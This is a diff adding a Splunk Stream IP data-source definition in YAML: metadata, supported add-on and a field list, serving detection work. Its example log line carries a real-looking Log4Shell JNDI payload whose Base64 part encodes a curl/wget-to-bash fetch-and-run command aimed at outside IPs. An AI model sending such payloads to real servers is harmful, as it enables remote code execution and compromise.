@@ -1,0 +1,79 @@
+name: Splunk Stream IP
+id: c96f5906-f601-4f32-a26c-482535159bc2
+version: 1
+date: '2024-07-18'
+author: Patrick Bareiss, Splunk
+description: Data source object for Splunk Stream IP
+source: stream:ip
+sourcetype: stream:ip
+supported_TA:
+- name: Splunk Stream
+  url: https://splunkbase.splunk.com/app/1809
+  version: 8.1.3
+fields:
+- _time
+- action
+- app
+- bytes
+- bytes_in
+- bytes_out
+- category
+- date_hour
+- date_mday
+- date_minute
+- date_month
+- date_second
+- date_wday
+- date_year
+- date_zone
+- dest
+- dest_ip
+- dest_port
+- eventtype
+- host
+- http_content_type
+- http_method
+- http_referer
+- http_referrer
+- http_user_agent
+- http_user_agent_length
+- http_x_forwarded_for
+- http_x_header
+- https
+- index
+- linecount
+- nginx_version
+- product
+- protocol
+- punct
+- request_time
+- response_time
+- server
+- site
+- source
+- sourcetype
+- splunk_server
+- src
+- src_ip
+- status
+- status_description
+- status_type
+- tag
+- tag::eventtype
+- time_local
+- timeendpos
+- timestartpos
+- uri_path
+- url
+- url_domain
+- url_length
+- vendor
+- vendor_product
+- version
+- web_server
+example_log: site="localhost" server="localhost" dest_port="80" dest_ip="127.0.0.1"
+  src="127.0.0.1" src_ip="127.0.0.1" user="-" time_local="14/Dec/2021:00:41:27 +0000"
+  protocol="HTTP/1.1" status="400" bytes_out="262" bytes_in="196" http_referer="${jndi:ldap://10.0.1.16:1389/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC85Ni4xMjYuOTYuMTY6ODA4MHx8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC85Ni4xMjYuOTYuMTY6ODA4MCl8YmFzaA==}]"
+  http_user_agent="curl/7.58.0" nginx_version="1.21.3" http_x_forwarded_for="-" http_x_header="-"
+  uri_query="-" uri_path="/" http_method="GET" response_time="0.004" cookie="-" request_time="0.004"
+  category="application/json" https=""
